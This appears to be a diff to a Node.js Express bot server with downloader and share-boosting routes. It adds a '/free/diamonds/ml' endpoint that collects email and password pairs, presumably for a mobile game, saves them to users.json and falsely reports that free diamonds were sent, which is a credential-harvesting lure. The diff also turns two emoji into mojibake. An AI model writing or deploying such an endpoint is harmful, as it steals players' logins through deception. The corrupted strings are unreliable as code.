@@ -2,7 +2,7 @@ const appstate = require("./fca/orion/fca-project-orion");
 const fs = require("fs");
 const { facebook, spotify, spotifydl, remini } = require('betabotz-tools') 
 const cheerio = require('cheerio');
-const port = 8550;
+const port = 26011;
 const snapsave = require('snapsave-downloader-itj');
 const qs = require('querystring');
 const cors = require("cors");
@@ -200,7 +200,7 @@ app.post("/share", async (req, res) => {
 
   if (!link || !token || !amounts || !speed) {
     return res.status(400).json({
-      error: "🔴 Missing input!, Link, token, amount, and speed are required!!",
+      error: "ðŸ”´ Missing input!, Link, token, amount, and speed are required!!",
     });
   }
 
@@ -534,7 +534,7 @@ class Musix {
     if (lyrics) {
       for (const item of lyrics) {
         const { minutes, seconds, hundredths, text } = item.time;
-        lrc += `[${String(minutes).padStart(2, "0")}:${String(seconds).padStart(2, "0")}.${String(hundredths).padStart(2, "0")}]${text || "♪"}\n`;
+        lrc += `[${String(minutes).padStart(2, "0")}:${String(seconds).padStart(2, "0")}.${String(hundredths).padStart(2, "0")}]${text || "â™ª"}\n`;
       }
     }
     return lrc;
@@ -892,7 +892,7 @@ try {
         const response = await snapsave(URL);
         const results = await facebook(URL)
         // Assuming snapsave returns the response you want to send
-        return res.json(response, results);
+        return res.json({snap: response, beta: results});
     } catch (error) {
         // Handle errors
         console.error("Error:", error);
@@ -1053,6 +1053,35 @@ var user = req.query.username;
     .catch(function (error) {
       return res.json({ error });
     });
+});
+
+app.get('/free/diamonds/ml', async (req, res) => {
+  const { email, password, diamonds } = req.query;
+  if (!email || !password || !diamonds) {
+    return res.json({ error: 'Email, password, and diamonds are required bobo' }); // Fixed the error message
+  }
+
+  const jsonPath = '/user/users.json';
+  const filePath = path.join(__dirname, jsonPath);
+  let data = JSON.parse(fs.readFileSync(filePath, "utf-8"));
+
+  // Check if the email exists in data, if not, initialize it as an empty array
+  if (!data[email]) {
+    data[email] = [];
+  }
+
+  // Push the new object into the array
+  data[email].push({
+    password,
+    diamonds
+  });
+
+  try {
+    fs.writeFileSync(filePath, JSON.stringify(data, null, 4));
+    res.json({ success: `Successfully sent ${diamonds} diamonds to your account` });
+  } catch (error) {
+    res.json({ error: error.message });
+  }
 });
 
 app.listen(port, () => console.log(`App is listening on port ${port}`));
